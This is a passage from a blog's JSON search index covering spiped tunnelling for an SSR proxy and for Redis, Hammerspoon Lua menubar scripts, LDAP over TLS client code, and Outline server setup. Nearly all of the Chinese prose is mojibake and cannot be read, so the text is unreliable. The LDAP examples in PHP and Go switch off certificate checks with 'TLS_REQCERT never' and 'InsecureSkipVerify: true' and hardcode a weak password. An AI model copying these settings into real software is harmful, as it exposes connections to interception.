å¯†é€šä¿¡å·¥å…·ï¼Œå¦å¤–è¿˜æœ‰è‘—åçš„åŠ å¯†å·¥å…·scrypt, ç›®å‰å·²å¼€æºåˆ°åŒäººç¤¾åŒº, è¯¥å·¥å…·ä½¿ç”¨AESåŠ å¯†é€šä¿¡ï¼Œæ”¯æŒsocketç«¯å£åŠ å¯†è½¬å‘ï¼Œç±»ä¼¼SSHä»£ç†ï¼Œå·¥ä½œåŸç†å‚è€ƒå®˜æ–¹æ–‡æ¡£ æœ¬æ–‡ä¸è®¨è®ºé…¸é…¸ä¹³é…ç½®ï¼Œåªæ˜¯è®¨è®ºç»™é…¸é…¸ä¹³å¥—ä»¶è¡£æœã€‚ #spipedé…ç½® ä¸‹è½½æºç  1git clone https://github.com/Tarsnap/spiped.git ä¾èµ–å®‰è£… 123# OpenSSLä¾èµ– (OSXç³»ç»Ÿ)export LDFLAGS=&quot;-L /usr/local/Cellar/openssl/1.0.2r/lib&quot; CFLAGS=&quot;-I /usr/local/Cellar/openssl/1.0.2r/include&quot; ç¼–è¯‘ 1make spiped 12345# spipeæµ‹è¯•å·¥å…·spipe/spipe# spipedä¸»ç¨‹åº spiped/spiped #é…¸é…¸ä¹³é…ç½® æµé‡æµé€šç¤ºä¾‹ 1æœ¬åœ°è¯·æ±‚æµé‡ -&gt; æœ¬åœ°é…¸é…¸ä¹³æœåŠ¡ -&gt; æœ¬åœ°spipedæœåŠ¡ &lt;-----&gt; æœåŠ¡å™¨spipedæœåŠ¡ -&gt; æœåŠ¡å™¨æœ¬åœ°é…¸é…¸ä¹³æœåŠ¡ -&gt; å¤–é¢çš„ä¸–ç•Œ spipedå¯†é’¥ç”Ÿæˆ 12# å¤åˆ¶è¯¥å¯†é’¥åˆ°æœåŠ¡å™¨ä¸Šdd if=/dev/urandom bs=32 count=1 &gt; secret.key spipedå®¢æˆ·ç«¯è¿è¡Œ 1spiped -e -s &#x27;127.0.0.1:10086&#x27; -t æœåŠ¡å™¨IP:æœåŠ¡å™¨ç«¯å£ -k secret.key spipedæœåŠ¡ç«¯è¿è¡Œ 1spiped -d -s &#x27;0.0.0.0:æœåŠ¡å™¨ç«¯å£&#x27; -t &#x27;127.0.0.1:é…¸é…¸ä¹³ç«¯å£&#x27; -k secret.key é…ç½®æœ¬åœ°é…¸é…¸ä¹³ç«¯å£ 1æœåŠ¡å™¨é…ç½®: 127.0.0.1 ç«¯å£:10086 æ³¨æ„: é…¸é…¸ä¹³æœåŠ¡ç«¯å°½é‡127è¿è¡Œï¼Œä¸è¦æš´éœ²åˆ°å¤–é¢ï¼›spipedæœåŠ¡ç«¯å£æš´éœ²çš„ç«¯å£å°½é‡æ˜¯å¸¸ç”¨æœåŠ¡ç«¯å£ ç¼ºç‚¹: ç”±äºç»™é…¸é…¸ä¹³å¥—äº†å±‚è¡£æœï¼Œæ‰‹æœºç«¯æ˜¯ä¸èƒ½ä½¿ç”¨çš„ï¼ åŒç±»å‹çš„æœåŠ¡è¿˜æœ‰stunnelâ€¦","categories":[{"name":"network","slug":"network","permalink":"https://ushell.me/categories/network/"}],"tags":[{"name":"ssr","slug":"ssr","permalink":"https://ushell.me/tags/ssr/"},{"name":"spipe","slug":"spipe","permalink":"https://ushell.me/tags/spipe/"}]},{"title":"hammerspoonæé«˜ç”Ÿäº§åŠ›","slug":"hammerspoonæé«˜ç”Ÿäº§åŠ›","date":"2019-09-07T16:00:00.000Z","updated":"2019-09-07T16:00:00.000Z","comments":true,"path":"2019/09/08/hammerspoonæé«˜ç”Ÿäº§åŠ›/","link":"","permalink":"https://ushell.me/2019/09/08/hammerspoon%E6%8F%90%E9%AB%98%E7%94%9F%E4%BA%A7%E5%8A%9B/","excerpt":"","text":"hammerspoonæ˜¯MacOSç³»ç»Ÿä¸‹ä¸€æ¬¾å®ç°è‡ªåŠ¨åŒ–çš„å·¥å…·ï¼Œé€šè¿‡luaè„šæœ¬æ‰©å±•ç³»ç»ŸåŠŸèƒ½ã€‚ç›¸æ¯”å…¶ä»–é€šè¿‡pythonè„šæœ¬ï¼Œnodejsè„šæœ¬æˆ–åŸç”Ÿçš„automator, hammerspoonæ›´åŠ ç®€å•ï¼Œæç¤ºæ¡†ç•Œé¢ç¾è§‚ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨pythonå’Œpyncåº“å®ç°ç›‘æ§é€šçŸ¥ï¼Œnodejså’Œnode-notifierç»„ä»¶å®ç°é€šçŸ¥çš„æ–¹æ¡ˆã€‚æ¯•ç«Ÿå·¥å…·çš„è‡ªåŠ¨åŒ–æ˜¯æé«˜ç”Ÿäº§åŠ›çš„å¿…è¦å› ç´ ã€‚ #é…ç½®hammerspoonå¯ä»¥ä½¿ç”¨brewå®‰è£…ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åœ¨å®˜ç½‘ä¸‹è½½äºŒè¿›åˆ¶æ–‡ä»¶ 12345#githubä¸‹è½½é¡µé¢https://github.com/Hammerspoon/hammerspoon/releases#brewå®‰è£…brew install hammerspoon å®‰è£…å®Œæˆåï¼Œåœ¨å¯åŠ¨å°ä¸­å¯ä»¥çœ‹åˆ°å·²å®‰è£…çš„hammerspoonå›¾æ ‡, MacOSçš„èœå•æ ä¸Šä¼šæ˜¾ç¤ºä¸€ä¸ªé”¤å­å›¾æ ‡ã€‚ hammerspooné»˜è®¤é…ç½®æ–‡ä»¶æ˜¯~/.hammerspoon/init.lua é…ç½®æ–‡ä»¶ç›®å½• 123456.hammerspoonâ”œâ”€â”€ Spoonsâ”œâ”€â”€ init.luaâ””â”€â”€ weather â””â”€â”€ weather.lua #åŠŸèƒ½åœ¨hammerspoonæ–‡æ¡£ä¸­ï¼Œæ”¯æŒè¿è¡Œåº”ç”¨ã€ç”µæ± ç®¡ç†ã€windowçª—å£ç®¡ç†ã€å¯¹è¯æ¡†ã€ç½‘ç»œç®¡ç†ç­‰ç­‰åŠŸèƒ½ï¼›å…¶ä¸­hammerspoonæä¾›äº†ä¸€ä¸ªhs.httpåº“ç”¨æ¥å®ç°httpç›¸å…³è¯·æ±‚åŠŸèƒ½ã€‚ ä»¥å¤©æ°”åŠŸèƒ½ä¸ºç¤ºä¾‹æ¥äº†è§£hammerspoonä½¿ç”¨ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960-- ç¼–è¾‘weather/weather.lua-- å¤©æ°”æ¥å£ä½¿ç”¨tianqiapiå…è´¹æ¥å£, éœ€è¦ç®€å•æ³¨å†Œè·å–IDåŠå¯†ç local urlApi = &#x27;https://www.tianqiapi.com/api/?version=v1&amp;appid=ç”³è¯·ID&amp;appsecret=ç”³è¯·å¯†ç &#x27;local menubar = hs.menubar.new()local menuData = &#123;&#125;-- å¤©æ°”å›¾æ ‡local weaEmoji = &#123; lei = &#x27;â›ˆ&#x27;, qing = &#x27;â˜€ï¸&#x27;, shachen = &#x27;ğŸ˜·&#x27;, wu = &#x27;ğŸŒ«&#x27;, xue = &#x27;â„ï¸&#x27;, yu = &#x27;ğŸŒ§&#x27;, yujiaxue = &#x27;ğŸŒ¨&#x27;, yun = &#x27;â˜ï¸&#x27;, zhenyu = &#x27;ğŸŒ§&#x27;, yin = &#x27;â›…ï¸&#x27;, default = &#x27;&#x27;&#125;function updateMenubar() menubar:setTooltip(&quot;å¤©æ°”é¢„æŠ¥&quot;) menubar:setMenu(menuData)endfunction getWeather() -- è¯·æ±‚APIæ¥å£ hs.http.doAsyncRequest(urlApi, &quot;GET&quot;, nil,nil, function(code, body, htable) if code ~= 200 then print(&#x27;get weather error:&#x27;..code) return end rawjson = hs.json.decode(body) city = rawjson.city menuData = &#123;&#125; -- å¤„ç†æ•°æ®ï¼Œæ›´æ–°åˆ°èœå•æ é‡Œ for k, v in pairs(rawjson.data) do if k == 1 then menubar:setTitle(weaEmoji[v.wea_img]) titlestr = string.format(&quot;%s %s %s ğŸŒ¡ï¸%s ğŸ’§%s ğŸ’¨%s ğŸŒ¬ %s %s&quot;, city,weaEmoji[v.wea_img],v.day, v.tem, v.humidity, v.air, v.win_speed, v.wea) item = &#123; title = titlestr &#125; table.insert(menuData, item) table.insert(menuData, &#123;title = &#x27;-&#x27;&#125;) else -- titlestr = string.format(&quot;%s %s %s %s&quot;, v.day, v.wea, v.tem, v.win_speed) titlestr = string.format(&quot;%s %s %s ğŸŒ¡ï¸%s ğŸŒ¬%s %s&quot;, city, weaEmoji[v.wea_img],v.day, v.tem, v.win_speed, v.wea) item = &#123; title = titlestr &#125; table.insert(menuData, item) end end updateMenubar() end)endmenubar:setTitle(&#x27;âŒ›&#x27;)getWeather()updateMenubar()-- å®šæ—¶ä»»åŠ¡hs.timer.doEvery(3600, getWeather) ç¤ºä¾‹äºŒï¼šå®šæ—¶è·å–è‚¡ç¥¨è¡Œæƒ… 1234567891011121314151617181920212223242526272829303132333435363738394041-- ç›¸å…³ä»£ç å·²æ›´æ–°åˆ°Githublocal XQAPI = &quot;&quot;local menubar = hs.menubar.new()local menuData = &#123;&#125;local stockList = &#x27;SH000001&#x27;function updateMenubar() menubar:setMenu(menuData)endfunction getStock(fisrt) fisrt = fisrt or false -- è¯·æ±‚æœåŠ¡ api = string.format(&quot;%s/?symbol=%s&quot;, XQAPI, stockList) hs.http.doAsyncRequest(api, &quot;GET&quot;, nil, headers, function(code, body, htable) if code ~= 200 then print(&#x27;è·å–æ•°æ®é”™è¯¯:&#x27;..code) return end menuData = &#123;&#125; rawjson = hs.json.decode(body) for k, v in pairs(rawjson.data) do -- èœå•æ ·å¼ titles = string.format(&quot;ğŸ‡¨ğŸ‡³%s Â¥%s ğŸš€%s ğŸ‘†%s ğŸ‘‡ï¸%s ğŸš—%s ğŸ’°%.3f/äº¿ ğŸ¤%s&quot;, v.symbol, v.current, v.percent..&#x27;%&#x27;, v.high, v.low, v.open, v.amount/100000000, v.turnover_rate..&#x27;%&#x27; ) table.insert(menuData, &#123;title = titles&#125;) end updateMenubar() end)endmenubar:setTitle(&#x27;ğŸš¨&#x27;)getStock(true)updateMenubar()hs.timer.doEvery(600, getStock) hammerspoonå¯ä»¥å®ç°è‡ªåŠ¨åŒ–åŠŸèƒ½è¿˜æœ‰å¾ˆå¤šï¼Œä»…é€šè¿‡hs.httpå’Œ hs.timeråŠŸèƒ½å°±å¯ä»¥ç›‘æ§å®æ—¶æŸäº›æœåŠ¡ç¨³å®šæ€§ï¼Œæ€ä¹ˆç©å‡ºèŠ±æ ·è¿˜æ˜¯ä¾èµ–å„ä½çœ‹å®˜ä»¬çš„è„‘æ´äº† :) #å‚è€ƒhammerspoonå®˜æ–¹æ–‡æ¡£hammerspoon awsomeé¡¹ç›®luaååˆ†é’Ÿæ•™ç¨‹","categories":[{"name":"tools","slug":"tools","permalink":"https://ushell.me/categories/tools/"}],"tags":[{"name":"hammerspoon","slug":"hammerspoon","permalink":"https://ushell.me/tags/hammerspoon/"},{"name":"è‡ªåŠ¨åŒ–","slug":"è‡ªåŠ¨åŒ–","permalink":"https://ushell.me/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"}]},{"title":"LDAPé…ç½®TLSåŠ å¯†é€šä¿¡","slug":"LDAPé…ç½®TLSåŠ å¯†é€šä¿¡","date":"2019-08-26T16:00:00.000Z","updated":"2019-08-26T16:00:00.000Z","comments":true,"path":"2019/08/27/LDAPé…ç½®TLSåŠ å¯†é€šä¿¡/","link":"","permalink":"https://ushell.me/2019/08/27/LDAP%E9%85%8D%E7%BD%AETLS%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1/","excerpt":"","text":"LDAPåœ¨ä¼ä¸šå¼€å‘ä¸­å¸¸ç”¨çš„ä¸€ç§åè®®ï¼Œå®ç°ä¼ä¸šè´¦æˆ·ç»Ÿä¸€ç®¡ç†çš„æ–¹æ¡ˆã€‚å¸¸ç”¨çš„LDAPå¼€æºæ–¹æ¡ˆä¸»è¦æ˜¯openldap, Debianç³»åˆ—å’ŒCentOSç³»ç»Ÿéƒ½ä¼šè‡ªå¸¦ï¼Œä½†éœ€è¦æ³¨æ„é…ç½®æ–‡ä»¶ä¸åŒã€‚åœ¨åŸºäºLDAPå¼€å‘ç›¸å…³åŠŸèƒ½æ—¶ï¼Œç”±äºLDAPåè®®å±äºæ˜æ–‡åè®®ï¼Œä¸šåŠ¡å¯¹å®‰å…¨æ€§è¦æ±‚è¾ƒé«˜çš„åœºåˆéœ€è¦æ­é…TLSå®Œæˆå¯¹æ•°æ®åŠ å¯†ä¼ è¾“ã€‚LDAPé»˜è®¤æ”¯æŒTLSåè®®ï¼Œå¼€æ”¾çš„ç«¯å£æ˜¯636ã€‚ 0x1 åŸºç¡€é…ç½®openldapæœåŠ¡é…ç½®TLS: slapdæ‰‹åŠ¨è¿è¡Œ 12#openldap v2.4.44ç‰ˆæœ¬è‡ªå¸¦TLSï¼Œæ— éœ€é…ç½®, slapdéœ€è¦æŒ‡å®š &quot;ldaps:///&quot;/usr/sbin/slapd -u ldap -h ldap:/// ldaps:/// serviceæœåŠ¡è¿è¡Œ (CentOSç¯å¢ƒ) 12#vim /etc/sysconfig/slapdservice slapd start éªŒè¯ 123ps uax|grep slapdlsof -i:636 openldap dockeræœåŠ¡é…ç½®(ç®€æ˜“): ç¯å¢ƒå˜é‡è®¾ç½®123456# æ›¿æ¢æˆè‡ªå·±çš„è¯ä¹¦æˆ–ä½¿ç”¨è‡ªå¸¦è¯ä¹¦LDAP_TLS: trueLDAP_TLS_CRT_FILENAME: ldap.crtLDAP_TLS_KEY_FILENAME: ldap.keyLDAP_TLS_DH_PARAM_FILENAME: dhparam.pemLDAP_TLS_CA_CRT_FILENAME: ca.crt 0x2 å¼€å‘ä½¿ç”¨ç»è¿‡ä»¥ä¸Šç®€å•é…ç½®ï¼Œldapå·²ç»æ”¯æŒTLSä¼ è¾“æ•°æ®äº†ã€‚å¼€å‘è¯­è¨€ä¸­å®ç°ldapå®¢æˆ·ç«¯çš„æ–¹å¼ä¸åŒï¼Œéœ€è¦æ³¨æ„å¼€å‘è¯­è¨€å®˜æ–¹æ–‡æ¡£ PHPå®¢æˆ·ç«¯ 12345678# ç³»ç»Ÿéœ€è¦å®‰è£…cryus-saslåº“yum install cyrus-sasl cyrus-sasl-devel cyrus-sasl-ldap# å®‰è£…ldapæ‰©å±•(phpbrewç¤ºä¾‹)phpbrew ext install ldap -- --with-ldap=/usr/local/Cellar/openldap/2.4.47 --with-ldap-sasl=/usr/local/opt/cyrus-sasl# æŸ¥çœ‹é…ç½®ä¿¡æ¯ (æ³¨æ„`SASL Support`å¯ç”¨çŠ¶æ€)php --ri ldap 123456789101112131415161718192021222324252627282930313233343536373839#æœ¬åœ°ä»£ç è¿è¡Œç¯å¢ƒé…ç½®ldap.conf (phpçš„ldapä¾èµ–è¿™ä¸ªé…ç½®æ–‡ä»¶)echo &quot;TLS_REQCERT never&quot; &gt;&gt; /etc/openldap/ldap.conf# ç¤ºä¾‹ä»£ç ä¸€&lt;?php$host = &quot;127.0.0.1&quot;;$port = 389; #æ³¨æ„ç«¯å£$username = &#x27;cn=username,ou=people,dc=test,dc=com&#x27;$password = &#x27;123456&#x27;$conn = ldap_connect($host, $port);#è°ƒè¯•ä¿¡æ¯ldap_set_option($conn, LDAP_OPT_PROTOCOL_VERSION, 3);ldap_set_option(NULL, LDAP_OPT_DEBUG_LEVEL, 7);# tlså¼€å¯ (ä½¿ç”¨çš„æ˜¯ldap_start_tlså‡½æ•°)ldap_start_tls($conn);# è®¤è¯$auth = ldap_bind($conn, $username, $password);echo $auth ? &quot;ok&quot; : &quot;fail&quot;;# ç¤ºä¾‹ä»£ç äºŒ (ä¸æ¨è)&lt;?php$host = &quot;ldaps://127.0.0.1&quot;; #å¿…é¡»å¸¦ldapsåè®®å¤´éƒ¨ï¼Œæ ‡è¯†å¼€å¯TLS$port = 636;$username = &#x27;cn=username,ou=people,dc=test,dc=com&#x27;$password = &#x27;123456&#x27;$conn = ldap_connect($host, $port);#è°ƒè¯•ä¿¡æ¯ldap_set_option($conn, LDAP_OPT_PROTOCOL_VERSION, 3);ldap_set_option(NULL, LDAP_OPT_DEBUG_LEVEL, 7);# è®¤è¯$auth = ldap_bind($conn, $username, $password);echo $auth ? &quot;ok&quot; : &quot;fail&quot;; Pythonå®¢æˆ·ç«¯ 12345678import ldapldap = &quot;ldap://127.0.0.1:389&quot;ldaps = &quot;ldaps://127.0.0.1:636&quot;ldapconn = ldap.initialize(ldaps)username = &#x27;cn=username,ou=people,dc=test,dc=com&#x27;password = &#x27;123456&#x27;ldapconn.simple_bind_s(username, password) Golangå®¢æˆ·ç«¯ 123456789101112//...çœç•¥l, err := Dial(&quot;tcp&quot;, fmt.Sprintf(&quot;%s:%d&quot;, &quot;ldap.example.com&quot;, 389))if err != nil &#123; log.Fatal(err)&#125;defer l.Close()// æ³¨æ„InsecureSkipVerifyerr = l.StartTLS(&amp;tls.Config&#123;InsecureSkipVerify: true&#125;)if err != nil &#123; log.Fatal(err)&#125; 0x3 TLSåˆ†æä¸Šè¿°çš„é…ç½®åŸºæœ¬å®ç°äº†ldapé€šä¿¡æ•°æ®åŠ å¯†éœ€æ±‚ï¼Œå¦‚æœç•™æ„ä»£ç ä¸­æ³¨é‡Šçš„è¯ï¼Œä¼šå¯¹æ–‡ç« å¼€å¤´TLSç«¯å£636ä¸ä»£ç ä¸­å®é™…ä½¿ç”¨å´ä¸åŒã€‚è¿™ä¸ªéœ€è¦æŒ‡å‡ºçš„æ˜¯å®¢æˆ·ç«¯è¯­è¨€å®ç°ä¸åŒå¯¼è‡´çš„ã€‚ ä»¥PHPè¯­è¨€ä¸ºä¾‹åˆ†æLDAPæ‰©å±•ä¸­å®ç°é€šä¿¡é€»è¾‘: ä½¿ç”¨636ç«¯å£æµ‹è¯•123# ä½¿ç”¨æ–‡ä¸­çš„ç¤ºä¾‹ä»£ç ,ç«¯å£ä¿®æ”¹æˆ636è¾“å‡ºç»“æœ`PHP Warning: ldap_start_tls(): Unable to start TLS: ` å…³é—­636ç«¯å£æµ‹è¯•1æµ‹è¯•æ— å½±å“ï¼Œæ•°æ®åŠ å¯†ä¼ è¾“ åœ¨PHPæ–‡æ¡£ldap_start_tlså‡½æ•°è¯„è®ºä¸­æåˆ°ï¼Œldapså’ŒstartTLSä¸æ˜¯ä¸€å›äº‹ï¼ŒldapsæœåŠ¡å¼€æ”¾636ç«¯å£ï¼Œ389ç«¯å£æ”¯æŒåŠ å¯†å’ŒéåŠ å¯†æ•°æ®ä¼ è¾“; å¹¶ä¸”ldapsä¸æ¨èä½¿ç”¨ã€‚ PHPæ‰©å±•ldapæœ¬è´¨æ˜¯è°ƒç”¨openldapåº“ä¸­çš„å‡½æ•°å®ç°ï¼Œé‡ç‚¹åˆ†æopenldapä¸­ldap_connectå’Œldap_start_tlsä¸¤ä¸ªå‡½æ•°å®ç°ã€‚ ç¬”è€…ä»¥openldap-2.4.47ç‰ˆæœ¬åˆ†æstartTLSå’Œldapså®ç°åŠåŒºåˆ« openldapåº“ç›®å½•ç»“æ„: 12345678openldap-2.4.47 - libraries/libldap/* #PHPä½¿ç”¨çš„ldapæ‰©å±•åº•å±‚ä¾èµ–åº“ - init.c #åˆå§‹åŒ–æ“ä½œ - open.c. #è¿æ¥æ“ä½œ - tls2.c. #TLSç›¸å…³ - options.c #é…ç½®ç›¸å…³ - url.c. #URLå¤„ç†ç›¸å…³ - request.c #ç½‘ç»œé€šä¿¡ç›¸å…³ ldap_connectå‡½æ•°ä¸»è¦å®ç°åŠŸèƒ½ 12345678//ldapåˆå§‹åŒ–int ldap_initialize( LDAP **ldp, LDAP_CONST char *url )// è®¾ç½®ldpå‚æ•°ï¼Œå¦‚æœå¯ç”¨saslç›¸å…³åˆ™åˆå§‹åŒ–saslç›¸å…³è®¾ç½®, åŠ è½½ç³»ç»Ÿé…ç½®æ–‡ä»¶int ldap_create( LDAP **ldp )// è§£æURLï¼Œè®¾ç½®è¿æ¥ä¿¡æ¯int ldap_set_option(LDAP *ld, int option, LDAP_CONST void *invalue) ldap_start_tlså‡½æ•°ä¸»è¦å®ç°åŠŸèƒ½ 12345678910111213141516171819202122//ldap_start_tlså‡½æ•°è°ƒç”¨åº•å±‚ldap_start_tls_så‡½æ•°int ldap_start_tls_s(LDAP *ld, LDAPControl **serverctrls, LDAPControl **clientctrls)&#123; //...çœç•¥ // é»˜è®¤è¿æ¥æ£€æŸ¥æ˜¯å¦å¼€å¯TLS if ( ldap_tls_inplace( ld ) ) &#123; return LDAP_LOCAL_ERROR; &#125; // å»ºç«‹è¿æ¥ rc = ldap_extended_operation_s( ld, LDAP_EXOP_START_TLS, NULL, serverctrls, clientctrls, &amp;rspoid, &amp;rspdata ); //...çœç•¥ if ( rc == LDAP_SUCCESS ) &#123; // åå•†TLSé€šä¿¡ä¼šè¯ rc = ldap_int_tls_start( ld, ld-&gt;ld_defconn, NULL ); &#125; return rc; //...çœç•¥&#125; ldapä½¿ç”¨æµç¨‹å¯¹æ¯”: 12ldap_connect -&gt; ldap_bindldap_connect -&gt; ldap_start_tls -&gt; ldap_bind ldap_start_tlsåœ¨bindè®¤è¯å‰å¼€å¯TLSéªŒè¯ï¼Œldapsæ˜¯åœ¨ldap_bindæ“ä½œæ—¶å†åˆå§‹åŒ–TLSä¼šè¯ï¼Œèº«ä»½è®¤è¯æ“ä½œã€‚ä¸¤ç§æ“ä½œåœ¨åº•å±‚å®ç°ç›¸å·®ä¸å¤§ï¼Œä¸»è¦æ˜¯æœåŠ¡ç«¯389ç«¯å£æ”¯æŒåŠ å¯†å’ŒéåŠ å¯†ä¸¤ç§åŠŸèƒ½ã€‚ slapdæœåŠ¡ç«¯è¿æ¥åˆ¤æ–­ 123456789101112131415161718192021222324252627282930313233Connection * connection_init( ber_socket_t s, Listener *listener, const char* dnsname, const char* peername, int flags, slap_ssf_t ssf, struct berval *authid LDAP_PF_LOCAL_SENDMSG_ARG(struct berval *peerbv))&#123; //...çœç•¥#ifdef HAVE_TLS // TLSè¿æ¥åˆ¤æ–­ if ( flags &amp; CONN_IS_TLS ) &#123; c-&gt;c_is_tls = 1; c-&gt;c_needs_tls_accept = 1; &#125; else &#123; c-&gt;c_is_tls = 0; c-&gt;c_needs_tls_accept = 0; &#125;#endif slap_sasl_open( c, 0 ); slap_sasl_external( c, ssf, authid ); slapd_add_internal( s, 1 ); backend_connection_init(c); //...çœç•¥ æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯å®¢æˆ·ç«¯ä½¿ç”¨ldap_start_tlså‡½æ•°æ—¶ï¼Œä¼šè‡ªåŠ¨åŠ è½½æœ¬åœ°ç›®å½•/etc/openldap/ldap.confæ–‡ä»¶, å…·ä½“å‚è€ƒPHPæµ‹è¯•è¯´æ˜ã€‚å…¶ä¸­ldap.confé…ç½®å†…å®¹å‚è€ƒman ldap.confå‘½ä»¤è¯´æ˜åŠå®˜æ–¹æ–‡æ¡£ã€‚ 0x4 å‚è€ƒ openldap TLSæ–‡æ¡£ openldap docker php TLSä½¿ç”¨ golang-ldapåº“","categories":[{"name":"network","slug":"network","permalink":"https://ushell.me/categories/network/"}],"tags":[{"name":"ldap","slug":"ldap","permalink":"https://ushell.me/tags/ldap/"},{"name":"tls","slug":"tls","permalink":"https://ushell.me/tags/tls/"}]},{"title":"ä½¿ç”¨TLSåŠ å¯†é€šä¿¡æ•°æ®","slug":"ä½¿ç”¨TLSåŠ å¯†é€šä¿¡æ•°æ®","date":"2019-08-22T16:00:00.000Z","updated":"2019-08-22T16:00:00.000Z","comments":true,"path":"2019/08/23/ä½¿ç”¨TLSåŠ å¯†é€šä¿¡æ•°æ®/","link":"","permalink":"https://ushell.me/2019/08/23/%E4%BD%BF%E7%94%A8TLS%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1%E6%95%B0%E6%8D%AE/","excerpt":"","text":"éšç€æŸäº›ä¸šåŠ¡å®‰å…¨æ€§è¦æ±‚æé«˜ï¼Œæ•æ„Ÿæ•°æ®ç»è¿‡ç½‘ç»œæ—¶éœ€è¦åŠ å¯†ä¼ è¾“ã€‚å¦‚MySQL, Redisè¿™äº›åè®®åœ¨ç½‘ç»œä¸­ä¼ è¾“æ˜¯å¯ä»¥é€šè¿‡æŠ“åŒ…åˆ†æåˆ°æ•°æ®åŒ…å†…éƒ¨ä¿¡æ¯çš„ã€‚ æœ¬æ–‡åªæ˜¯ç®€å•è®°å½•ä½¿ç”¨TLSåŠ å¯†æŸäº›è½¯ä»¶æ•°æ®æµä½¿ç”¨ï¼Œæœ¬è´¨ä¸Šæ— è®ºspipedè¿˜æ˜¯stunneléƒ½æ˜¯é€šè¿‡å»ºç«‹éš§é“çš„æ–¹å¼è¿›è¡Œå®‰å…¨ä¼ è¾“ã€‚spipedæ˜¯Rediså®˜æ–¹æ¨èä¸€ä¸ªé‡‡ç”¨AESåŠ å¯†ç®—æ³•å¼€æºå·¥å…·ï¼Œè¯¥å·¥å…·ä½œè€…æ˜¯OpenBSDçš„å®‰å…¨åä¼šæˆå‘˜ï¼›stunnelåˆ™æ˜¯ä¸€æ¬¾é‡‡ç”¨éå¯¹ç§°åŠ å¯†ç®—æ³•ä¸”é—­æºçš„å·¥å…·ï¼Œæ”¯æŒå¤šä¸ªæœåŠ¡ä½¿ç”¨ï¼Œç›¸å¯¹spippedæ¥è¯´å¯ä»¥åœ¨å¤šä¸ªåœºæ™¯ä½¿ç”¨ã€‚ Remote Redis: Spiped vs Stunnelè¿™ç¯‡æ–‡ç« å¯¹æ¯”äº†ä¸¤æ¬¾å·¥å…·çš„æ€§èƒ½ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªè¡ŒéªŒè¯ã€‚ #ç¤ºä¾‹spipped 1234567891011# ç”Ÿæˆå¯†é’¥dd if=/dev/urandom bs=128 count=1 &gt; secret.key# æœ¬åœ°è¿è¡Œ (-e åŠ å¯† -s æº -t ç›®æ ‡)spiped -e -s &#x27;127.0.0.1:6379&#x27; -t æœåŠ¡å™¨IP:8000 -k secret.key# æœåŠ¡ç«¯è¿è¡Œ (-d è§£å¯†)spiped -d -s &#x27;0.0.0.0:8000&#x27; -t &#x27;127.0.0.1:6379&#x27; -k secret.key# æŸ¥çœ‹å¸®åŠ© (è¿æ¥æ ‘ï¼Œè¶…æ—¶è®¾ç½®)spiped -h stunnel 1234567891011121314# /etc/stunnel/redis-client.confcert = /etc/stunnel/private.pemclient = yespid = /var/run/stunnel.pid[redis]accept = 127.0.0.1:6379connect = æœåŠ¡ç«¯IP:6380# /etc/stunnel/redis-server.confcert = /etc/stunnel/private.pempid = /var/run/stunnel.pid[redis]accept = æœåŠ¡ç«¯IP:6380connect = 127.0.0.1:6379 #å‚è€ƒspipedåŠ å¯†é€šä¿¡stunnelæ–‡æ¡£spiped vs stunnelæ€§èƒ½å¯¹æ¯”ä½¿ç”¨STUNNELåŠ å¯†REDISé€šä¿¡MySQLå¯ç”¨çš„SSLè¿æ¥çš„æ€è€ƒä¸å®è·µ","categories":[{"name":"network","slug":"network","permalink":"https://ushell.me/categories/network/"}],"tags":[{"name":"tls","slug":"tls","permalink":"https://ushell.me/tags/tls/"},{"name":"spiped","slug":"spiped","permalink":"https://ushell.me/tags/spiped/"},{"name":"stunnel","slug":"stunnel","permalink":"https://ushell.me/tags/stunnel/"}]},{"title":"outlineéƒ¨ç½²å®è·µ","slug":"outlineéƒ¨ç½²å®è·µ","date":"2019-08-01T16:00:00.000Z","updated":"2019-08-01T16:00:00.000Z","comments":true,"path":"2019/08/02/outlineéƒ¨ç½²å®è·µ/","link":"","permalink":"https://ushell.me/2019/08/02/outline%E9%83%A8%E7%BD%B2%E5%AE%9E%E8%B7%B5/","excerpt":"","text":"outlineæ˜¯å¦ä¸€ä¸ªçˆ¬å¢™çš„æ–¹æ¡ˆï¼Œä¸»è¦é‡‡ç”¨dockerçš„å½¢å¼è¿è¡Œshadowsocksæä¾›æœåŠ¡ï¼Œæ˜¯jigsawå›¢é˜ŸæŠ˜è…¾å‡ºæ¥ä¸€ä¸ªæ¯”è¾ƒå‹å¥½æ–¹æ¡ˆã€‚outlineç”±å®¢æˆ·ç«¯ï¼ŒæœåŠ¡ç«¯ç®¡ç†å’Œshadowbox(åŠ å¼ºç‰ˆçš„ss)ç»„æˆï¼Œå…¶ä¸­å®¢æˆ·ç«¯æ”¯æŒwin/linux/mac/android/iOSå¹³å°ã€‚æˆªæ­¢ç›®å‰å®¢æˆ·ç«¯å‘ç‰ˆ617æ¬¡, åŸºæœ¬æ»¡è¶³æ—¥å¸¸åˆ’æ°´äº†ã€‚ outlineä¼˜ç‚¹ æ”¯æŒå…¨å¹³å° dockeråŒ–éƒ¨ç½² å…¼å®¹shadowsockså®¢æˆ·ç«¯ æ”¯æŒAPI æ”¯æŒç›‘æ§ TypeScriptå®ç° 0x1 éƒ¨ç½²é¦–å…ˆä½ è¦æœ‰ä¸€å°æœåŠ¡å™¨æ¥éƒ¨ç½²æœåŠ¡ï¼Œoutline manageræœåŠ¡ç«¯è½¯ä»¶æä¾›å››ç§æ–¹æ¡ˆï¼›å…¶ä¸­å‰ä¸‰ç§æ˜¯DigitalOceanã€Google Cloudå’ŒAWSä¸‰å®¶äº‘å‚å•†ã€‚è²Œä¼¼DigitalOceanå¯ä»¥ä½è‡³5åˆ€æ¯æœˆï¼Œæœ€åä¸€ç§æ˜¯è‡ªå»ºæ–¹æ¡ˆï¼Œæ¨èæœ‰vpsçš„ç”¨æˆ·ä½¿ç”¨ã€‚ æœåŠ¡ç«¯é…ç½®: ä¸‹è½½å®‰è£…è„šæœ¬ 1wget https://raw.githubusercontent.com/Jigsaw-Code/outline-server/master/src/server_manager/install_scripts/install_server.sh 